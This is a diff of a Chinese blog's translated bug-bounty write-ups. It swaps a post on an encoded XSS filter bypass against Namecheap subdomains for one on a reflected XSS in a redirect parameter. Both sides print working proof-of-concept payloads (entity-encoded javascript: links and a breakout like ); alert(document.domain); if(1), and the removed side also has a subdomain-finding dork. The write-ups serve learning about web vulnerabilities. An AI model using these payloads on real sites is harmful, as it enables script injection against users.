@@ -15,20 +15,21 @@
 
 
 
-<meta name="description" content="原文：The story behined the Strong XSS filter bypass!漏洞：编码绕过XSS防火墙作者：Yeasir Arafat难度：中">
+<meta name="description" content="原文：My First 0day Exploit (Reflected XSS)漏洞：javascrip XSS作者：Ali TÜTÜNCÜ难度：低">
 <meta property="og:type" content="article">
-<meta property="og:title" content="第八篇翻译：绕过XSS防护">
-<meta property="og:url" content="http://TimeS0ng.github.io/2018/12/23/第八篇翻译：绕过XSS防护/index.html">
+<meta property="og:title" content="第十二篇翻译：反射型XSS">
+<meta property="og:url" content="http://TimeS0ng.github.io/2018/12/27/第十二篇翻译：反射型XSS/index.html">
 <meta property="og:site_name" content="TimeS0ng&#39;s blog">
-<meta property="og:description" content="原文：The story behined the Strong XSS filter bypass!漏洞：编码绕过XSS防火墙作者：Yeasir Arafat难度：中">
+<meta property="og:description" content="原文：My First 0day Exploit (Reflected XSS)漏洞：javascrip XSS作者：Ali TÜTÜNCÜ难度：低">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_8/1.png">
-<meta property="og:image" content="http://tie.027cgb.com/612577/times0ng_blog/translate_1/money.png">
-<meta property="og:updated_time" content="2018-12-23T07:54:46.790Z">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_12/1.png">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_12/2.png">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_12/3.png">
+<meta property="og:updated_time" content="2018-12-27T08:57:15.975Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="第八篇翻译：绕过XSS防护">
-<meta name="twitter:description" content="原文：The story behined the Strong XSS filter bypass!漏洞：编码绕过XSS防火墙作者：Yeasir Arafat难度：中">
-<meta name="twitter:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_8/1.png">
+<meta name="twitter:title" content="第十二篇翻译：反射型XSS">
+<meta name="twitter:description" content="原文：My First 0day Exploit (Reflected XSS)漏洞：javascrip XSS作者：Ali TÜTÜNCÜ难度：低">
+<meta name="twitter:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_12/1.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -60,7 +61,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>第八篇翻译：绕过XSS防护 | TimeS0ng&#39;s blog</title>
+<title>第十二篇翻译：反射型XSS | TimeS0ng&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -261,20 +262,20 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-第八篇翻译：绕过XSS防护" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-第十二篇翻译：反射型XSS" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/12/23/第八篇翻译：绕过XSS防护/" class="article-date">
-      <time datetime="2018-12-23T07:50:57.000Z" itemprop="datePublished">2018-12-23</time>
+      <a href="/2018/12/27/第十二篇翻译：反射型XSS/" class="article-date">
+      <time datetime="2018-12-27T08:55:58.000Z" itemprop="datePublished">2018-12-27</time>
 </a>
 
  
-    <a href="/2018/12/23/第八篇翻译：绕过XSS防护/#comments" title="查看评论">
+    <a href="/2018/12/27/第十二篇翻译：反射型XSS/#comments" title="查看评论">
         <i class="fa fa-comments-o" aria-hidden="true"></i>
         <span class="count-comment"></span>
         
         
-            <span class="disqus-comment-count" data-disqus-identifier="2018/12/23/第八篇翻译：绕过XSS防护/"></span>
+            <span class="disqus-comment-count" data-disqus-identifier="2018/12/27/第十二篇翻译：反射型XSS/"></span>
         
     </a>
 
@@ -289,7 +290,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      第八篇翻译：绕过XSS防护
+      第十二篇翻译：反射型XSS
     </h1>
   
 
@@ -306,21 +307,12 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h4 id="原文：The-story-behined-the-Strong-XSS-filter-bypass"><a href="#原文：The-story-behined-the-Strong-XSS-filter-bypass" class="headerlink" title="原文：The story behined the Strong XSS filter bypass!"></a>原文：<a href="https://medium.com/@Skylinearafat/the-story-behined-the-namecheap-xss-filter-bypass-be79624fd0c3" target="_blank" rel="external">The story behined the Strong XSS filter bypass!</a></h4><h4 id="漏洞：编码绕过XSS防火墙"><a href="#漏洞：编码绕过XSS防火墙" class="headerlink" title="漏洞：编码绕过XSS防火墙"></a>漏洞：编码绕过XSS防火墙</h4><h4 id="作者：Yeasir-Arafat"><a href="#作者：Yeasir-Arafat" class="headerlink" title="作者：Yeasir Arafat"></a>作者：<a href="https://medium.com/@Skylinearafat?source=post_header_lockup" target="_blank" rel="external">Yeasir Arafat</a></h4><h4 id="难度：中"><a href="#难度：中" class="headerlink" title="难度：中"></a>难度：中</h4><a id="more"></a>
-<h4 id="emsp-emsp-今天的主题是关于如何绕过XSS过滤。我已经观察目标网站很久了，并且一直在尝试利用谷歌语法试图发现网站的子域名，大家也可以尝试一下。好不容易找到几个子域，正当我尝试XSS注入的时候，却被防火墙各种蹂躏"><a href="#emsp-emsp-今天的主题是关于如何绕过XSS过滤。我已经观察目标网站很久了，并且一直在尝试利用谷歌语法试图发现网站的子域名，大家也可以尝试一下。好不容易找到几个子域，正当我尝试XSS注入的时候，却被防火墙各种蹂躏" class="headerlink" title="&emsp;&emsp;今天的主题是关于如何绕过XSS过滤。我已经观察目标网站很久了，并且一直在尝试利用谷歌语法试图发现网站的子域名，大家也可以尝试一下。好不容易找到几个子域，正当我尝试XSS注入的时候，却被防火墙各种蹂躏"></a>&emsp;&emsp;今天的主题是关于如何绕过XSS过滤。我已经观察目标网站很久了，并且一直在尝试利用谷歌语法试图发现网站的子域名，大家也可以尝试一下。好不容易找到几个子域，正当我尝试XSS注入的时候，却被防火墙各种蹂躏</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">site:*.*.namecheap.com &amp; site:*.namecheap.com</div></pre></td></tr></table></figure>
-<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_8/1.png" alt=""></p>
-<h4 id="emsp-emsp-虽然痛不欲生，但我是那种会放弃的人吗？经过多方面的尝试之后，终于发现了一种莫名其妙的编码方式能够绕过防火墙"><a href="#emsp-emsp-虽然痛不欲生，但我是那种会放弃的人吗？经过多方面的尝试之后，终于发现了一种莫名其妙的编码方式能够绕过防火墙" class="headerlink" title="&emsp;&emsp;虽然痛不欲生，但我是那种会放弃的人吗？经过多方面的尝试之后，终于发现了一种莫名其妙的编码方式能够绕过防火墙"></a>&emsp;&emsp;虽然痛不欲生，但我是那种会放弃的人吗？经过多方面的尝试之后，终于发现了一种莫名其妙的编码方式能够绕过防火墙</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;a href=&quot;javascript&amp;colon;alert&amp;lpar;document&amp;period;domain&amp;rpar;&quot;&gt;Click Here&lt;/a&gt;</div><div class="line">&quot;&gt;&lt;iframe/src=javascript&amp;colon;[document&amp;period;domain].find(alert(1))&gt;</div></pre></td></tr></table></figure>
-<h2 id="视屏"><a href="#视屏" class="headerlink" title="视屏"></a>视屏</h2><p>[*]xss-1</p>
-<video id="video" controls preload="none" poster="http://img5.imgtn.bdimg.com/it/u=750248180,3726006403&fm=26&gp=0.jpg"><br><source id="mp4" src="http://img.027cgb.com/612577/times0ng_blog/translate_8/xss-1.mp4"><br></video>
-
-
-
-<p>[*]xss-2</p>
-<video id="video" controls preload="none" poster="http://img5.imgtn.bdimg.com/it/u=750248180,3726006403&fm=26&gp=0.jpg"><br><source id="mp4" src="http://img.027cgb.com/612577/times0ng_blog/translate_8/xss-2.mp4"><br></video>
-
-
-
-<h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://tie.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
+        <h4 id="原文：My-First-0day-Exploit-Reflected-XSS"><a href="#原文：My-First-0day-Exploit-Reflected-XSS" class="headerlink" title="原文：My First 0day Exploit (Reflected XSS)"></a>原文：<a href="https://medium.com/@alicanact60/my-first-0day-exploit-csp-bypass-reflected-xss-bugbounty-c7efa4bed3d7" target="_blank" rel="external">My First 0day Exploit (Reflected XSS)</a></h4><h4 id="漏洞：javascrip-XSS"><a href="#漏洞：javascrip-XSS" class="headerlink" title="漏洞：javascrip XSS"></a>漏洞：javascrip XSS</h4><h4 id="作者：Ali-TUTUNCU"><a href="#作者：Ali-TUTUNCU" class="headerlink" title="作者：Ali TÜTÜNCÜ"></a>作者：<a href="https://medium.com/@alicanact60?source=post_header_lockup" target="_blank" rel="external">Ali TÜTÜNCÜ</a></h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
+<h2 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h2><h4 id="emsp-emsp-1-当我访问网址https-xxx-com-amp-iframe-redirect-scheme-redirect-amp-redirect-strategy-0-时，查看源码看到下面的JS代码"><a href="#emsp-emsp-1-当我访问网址https-xxx-com-amp-iframe-redirect-scheme-redirect-amp-redirect-strategy-0-时，查看源码看到下面的JS代码" class="headerlink" title="&emsp;&emsp;1. 当我访问网址https://xxx.com/amp-iframe-redirect?scheme_redirect=&amp;redirect_strategy=0 时，查看源码看到下面的JS代码"></a>&emsp;&emsp;1. 当我访问网址<a href="https://xxx.com/amp-iframe-redirect?scheme_redirect=&amp;redirect_strategy=0" target="_blank" rel="external">https://xxx.com/amp-iframe-redirect?scheme_redirect=&amp;redirect_strategy=0</a> 时，查看源码看到下面的JS代码</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_12/1.png" alt=""></p>
+<h4 id="emsp-emsp-2-然后我开始测试URL参数是否可控，可以看到redirect-strategy参数中的值被嵌入了JS代码中，但是特殊符号被HTML编码了"><a href="#emsp-emsp-2-然后我开始测试URL参数是否可控，可以看到redirect-strategy参数中的值被嵌入了JS代码中，但是特殊符号被HTML编码了" class="headerlink" title="&emsp;&emsp;2. 然后我开始测试URL参数是否可控，可以看到redirect_strategy参数中的值被嵌入了JS代码中，但是特殊符号被HTML编码了"></a>&emsp;&emsp;2. 然后我开始测试URL参数是否可控，可以看到redirect_strategy参数中的值被嵌入了JS代码中，但是特殊符号被HTML编码了</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://xxx.com/amp-iframe-redirect?scheme_redirect=&amp;redirect_strategy=&quot;&apos;&lt;&gt;/();</div></pre></td></tr></table></figure>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_12/2.png" alt=""></p>
+<h4 id="emsp-emsp-3-因为正常的XSS语句不能直接使用，所以我只能通过控制JS代码来嵌入XSS语句"><a href="#emsp-emsp-3-因为正常的XSS语句不能直接使用，所以我只能通过控制JS代码来嵌入XSS语句" class="headerlink" title="&emsp;&emsp;3. 因为正常的XSS语句不能直接使用，所以我只能通过控制JS代码来嵌入XSS语句"></a>&emsp;&emsp;3. 因为正常的XSS语句不能直接使用，所以我只能通过控制JS代码来嵌入XSS语句</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://xxx.com/amp-iframe-redirect?scheme_redirect=&amp;redirect_strategy=); alert(document.domain); if(1</div></pre></td></tr></table></figure>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_12/3.png" alt=""></p>
 
       
     </div>
@@ -329,13 +321,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/12/23/第八篇翻译：绕过XSS防护/">第八篇翻译：绕过XSS防护</a></p>
+        <p><span>本文标题:</span><a href="/2018/12/27/第十二篇翻译：反射型XSS/">第十二篇翻译：反射型XSS</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">TimeS0ng</a></p>
-        <p><span>发布时间:</span>2018-12-23, 15:50:57</p>
-        <p><span>最后更新:</span>2018-12-23, 15:54:46</p>
+        <p><span>发布时间:</span>2018-12-27, 16:55:58</p>
+        <p><span>最后更新:</span>2018-12-27, 16:57:15</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/12/23/第八篇翻译：绕过XSS防护/" title="第八篇翻译：绕过XSS防护">http://TimeS0ng.github.io/2018/12/23/第八篇翻译：绕过XSS防护/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://TimeS0ng.github.io/2018/12/23/第八篇翻译：绕过XSS防护/　　作者: TimeS0ng" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2018/12/27/第十二篇翻译：反射型XSS/" title="第十二篇翻译：反射型XSS">http://TimeS0ng.github.io/2018/12/27/第十二篇翻译：反射型XSS/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://TimeS0ng.github.io/2018/12/27/第十二篇翻译：反射型XSS/　　作者: TimeS0ng" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -347,16 +339,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/12/23/第九篇翻译：CORS跨域请求/">
-                    第九篇翻译：CORS跨域请求
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/12/23/第七篇翻译：bypass-CSRF/">
-                    第七篇翻译：bypass CSRF
+                <a href="/2018/12/27/第十一篇翻译：CSRF漏洞/">
+                    第十一篇翻译：CSRF漏洞
                 </a>
             </div>
         
@@ -368,7 +354,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#原文：The-story-behined-the-Strong-XSS-filter-bypass"><span class="toc-number">1.</span> <span class="toc-text">原文：The story behined the Strong XSS filter bypass!</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞：编码绕过XSS防火墙"><span class="toc-number">2.</span> <span class="toc-text">漏洞：编码绕过XSS防火墙</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#作者：Yeasir-Arafat"><span class="toc-number">3.</span> <span class="toc-text">作者：Yeasir Arafat</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#难度：中"><span class="toc-number">4.</span> <span class="toc-text">难度：中</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-今天的主题是关于如何绕过XSS过滤。我已经观察目标网站很久了，并且一直在尝试利用谷歌语法试图发现网站的子域名，大家也可以尝试一下。好不容易找到几个子域，正当我尝试XSS注入的时候，却被防火墙各种蹂躏"><span class="toc-number">5.</span> <span class="toc-text">  今天的主题是关于如何绕过XSS过滤。我已经观察目标网站很久了，并且一直在尝试利用谷歌语法试图发现网站的子域名，大家也可以尝试一下。好不容易找到几个子域，正当我尝试XSS注入的时候，却被防火墙各种蹂躏</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-虽然痛不欲生，但我是那种会放弃的人吗？经过多方面的尝试之后，终于发现了一种莫名其妙的编码方式能够绕过防火墙"><span class="toc-number">6.</span> <span class="toc-text">  虽然痛不欲生，但我是那种会放弃的人吗？经过多方面的尝试之后，终于发现了一种莫名其妙的编码方式能够绕过防火墙</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#视屏"><span class="toc-number"></span> <span class="toc-text">视屏</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#打赏译者"><span class="toc-number"></span> <span class="toc-text">打赏译者</span></a>
+            <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#原文：My-First-0day-Exploit-Reflected-XSS"><span class="toc-number">1.</span> <span class="toc-text">原文：My First 0day Exploit (Reflected XSS)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞：javascrip-XSS"><span class="toc-number">2.</span> <span class="toc-text">漏洞：javascrip XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#作者：Ali-TUTUNCU"><span class="toc-number">3.</span> <span class="toc-text">作者：Ali TÜTÜNCÜ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#难度：低"><span class="toc-number">4.</span> <span class="toc-text">难度：低</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#步骤："><span class="toc-number"></span> <span class="toc-text">步骤：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-1-当我访问网址https-xxx-com-amp-iframe-redirect-scheme-redirect-amp-redirect-strategy-0-时，查看源码看到下面的JS代码"><span class="toc-number">1.</span> <span class="toc-text">  1. 当我访问网址https://xxx.com/amp-iframe-redirect?scheme_redirect=&redirect_strategy=0 时，查看源码看到下面的JS代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-2-然后我开始测试URL参数是否可控，可以看到redirect-strategy参数中的值被嵌入了JS代码中，但是特殊符号被HTML编码了"><span class="toc-number">2.</span> <span class="toc-text">  2. 然后我开始测试URL参数是否可控，可以看到redirect_strategy参数中的值被嵌入了JS代码中，但是特殊符号被HTML编码了</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-3-因为正常的XSS语句不能直接使用，所以我只能通过控制JS代码来嵌入XSS语句"><span class="toc-number">3.</span> <span class="toc-text">  3. 因为正常的XSS语句不能直接使用，所以我只能通过控制JS代码来嵌入XSS语句</span></a></li></ol>
         
     </div>
     <style>
@@ -404,7 +390,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"第八篇翻译：绕过XSS防护　| TimeS0ng's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"第十二篇翻译：反射型XSS　| TimeS0ng's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -461,15 +447,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/12/23/第九篇翻译：CORS跨域请求/" title="上一篇: 第九篇翻译：CORS跨域请求">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2018/12/23/第七篇翻译：bypass-CSRF/" title="下一篇: 第七篇翻译：bypass CSRF">
+            <a href="/2018/12/27/第十一篇翻译：CSRF漏洞/" title="下一篇: 第十一篇翻译：CSRF漏洞">
                 <i class="fa fa-angle-right"></i>
             </a>
         
